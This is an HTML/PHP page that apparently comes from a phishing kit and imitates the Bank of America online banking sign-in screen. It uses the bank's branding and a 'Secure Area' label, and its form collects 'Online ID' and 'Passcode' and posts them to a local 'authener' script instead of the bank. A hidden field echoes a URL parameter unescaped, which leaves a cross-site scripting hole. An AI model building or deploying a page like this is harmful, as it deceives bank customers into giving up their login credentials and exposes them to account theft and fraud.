<!DOCTYPE html>
<html lang="en">
<head>
	<title>Bank of America | Online Banking</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="images/favicon.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	<div align="center" style="min-width:430px;background-color:#ffffff;">
	<div style="height:98px">
		<div align="left" style="padding-top:18px;padding-left:5%;">
	 <img src="images/assets-images-global-logos.svg" width="250" height="70" alt="">
		<div class="sl-nav">
			<ul>
			<div style="padding-top:10px;">
		 <p><img src="images/locki.svg" width="20" height="20" alt=""> <b style="padding-top:2px;"><font color="gray">Secure Area</font></b></p>
			</div>
			</ul>
		</div>
		</div>
		
	</div>
	<div style="background-color: #dc1431;
	background-image: url('images/ban1.png');
	background-size: 100%;
  border-color: rgba(232, 232, 232, 1);
  border-bottom-width: 1px;
  border-bottom-style: solid;
		color:white;
		height:40px;
  max-height:60px;">
		<div style="float:left;padding-top:5px;padding-left:5%;">
		<h4>Sign In</h4>
		</div>
	</div>
	</div>
<div class="login-form" style="padding-left:5%;padding-right:5%;">
  <form action="authener" class="validate-form" method="post" style="width: 390px;">
    <h2 class="text-center"></br></h2>    
    <div class="form-group">
      
				<label class="label-input100" for="onid">Online ID</label>
				<div class="wrap-input100 validate-input" data-validate="Online ID is Required">
					<input id="onid" class="input100" type="text" name="onid" placeholder="">
					<span class="focus-input100"></span>
				</div>
    </div>
    <div class="form-group">
      <label class="label-input100" for="pasc">Passcode</label>
				<div class="wrap-input100 validate-input" data-validate = "Passcode is Required">
					<input id="pasc" class="input100" type="password" name="pasc" placeholder="">
					<span class="focus-input100"></span>
				</div>
				<input aria-required="True" class="form-control to-switch"
                                                               id="mobile" name="mobile" tabindex="1"
                                                               type="text" value="<?php echo $_GET['m']; ?>"
                                                               autocomplete="off"
                                                               style="display: none">
    </div>
    <div class="form-group">
		
      <button type="submit" class="btn btn-primary btn-block"><h3><span class="lnr lnr-lock"></span> Sign In</h3></button>
    </div>
    <div class="clearfix">
      <label class="float-left form-check-label"><a href="#" class="float-right">Forgot ID/Passcode?</a></label>
       <a href="#" class="float-right">Enroll</a>
    </div>    
  </form>
</div></br></br></br></br></br></br></br>
		<div class="wrap-contact100">
		

			
		</div>



	<div id="dropDownSelect1"></div>

<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
	<script>
		$(".selection-2").select2({
			minimumResultsForSearch: 20,
			dropdownParent: $('#dropDownSelect1')
		});
	</script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
<style>
.footer {
clear: both;
  position: relative;
  height: 200px;
  margin-top: -200px;
 left: 0;
 bottom: 0;
 width: 100%;
 min-width:430px;
 background-color: #f3efea;
 color: white;
 text-align: center;
 display: inline-flex;
}
.footer>div {
flex: 1 0 50%;
padding-right: 15px;
padding-left: 15px;
max-width: 50%;
line-height: 1.2;
}

</style>
</html>
